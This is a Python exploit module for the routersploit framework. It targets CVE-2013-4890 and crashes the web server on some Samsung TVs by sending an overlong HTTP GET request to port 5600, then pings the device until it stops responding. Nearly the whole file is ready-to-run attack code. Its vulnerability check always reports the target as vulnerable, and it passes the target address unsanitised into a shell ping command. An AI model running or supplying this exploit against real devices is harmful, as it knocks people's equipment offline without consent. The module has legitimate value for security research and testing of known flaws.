#!/usr/bin/python

# Exploit Title: Samsung TV Denial of Service (DoS) Attack
# Date: 07/21/2013
# Exploit Author: Malik Mesellem - @MME_IT - http://www.itsecgames.com
# CVE Number: CVE-2013-4890
# Vendor Homepage: http://www.samsung.com
# Description: Resets some Samsung TVs
#   The web server (DMCRUIS/0.1) on port TCP/5600 is crashing by sending a long HTTP GET request
#   Tested successfully on my Samsung PS50C7700 plasma TV :)
 
import http.client
import sys
import os
from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient

class Exploit(HTTPClient):

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(5600, "Target HTTP port")



    __info__ = {

        "name": "cve_2013_4890",
        "description": "The web server (DMCRUIS/0.1) on port TCP/5600 is crashing by sending a long HTTP GET request "
                       "Tested successfully on my Samsung PS50C7700 plasma TV :) ",
        "authors": (
            "",  # vulnerability discovery
            "###",  # routersploit module
        ),
        "references": (
            "https://www.exploit-db.com/exploits/5054",
        ),
        "devices": (
            "Samsung","cve_2013_4890"
        ),

    }
    
    def run(self):
        if self.check():
            print_success("Target seems to be vulnerable")

            print_status("  ***************************************************************************************")
            print_status( "   Author: Malik Mesellem - @MME_IT - http://www.itsecgames.com\n")
            print_status( "   Exploit: Denial of Service (DoS) attack\n")
            print_status( "   Description: Resets some Samsung TVs\n")
            print_status( "     The web server (DMCRUIS/0.1) on port TCP/5600 is crashing by sending a long request.")
            print_status( "     Tested successfully on my Samsung PS50C7700 plasma TV :)\n")
            print_status( "  ***************************************************************************************\n")

            # Sends the payload
            print_status("  Sending the malicious payload...\n")
            conn = http.client.HTTPConnection(self.target,self.port)
            conn.request("GET", "A"*300)
            conn.close()

            # Checks the response
            print_status("  Checking the status... (CTRL+Z to stop)\n")
            response = 0
            while response == 0:
              response = os.system("ping -c 1 " + self.target + "> /dev/null 2>&1")
              if response != 0:
                print_success("  Target down!\n")
                
        else:

            print_error("Exploit failed - target seems to be not vulnerable")
    def check(self):
        
        return True
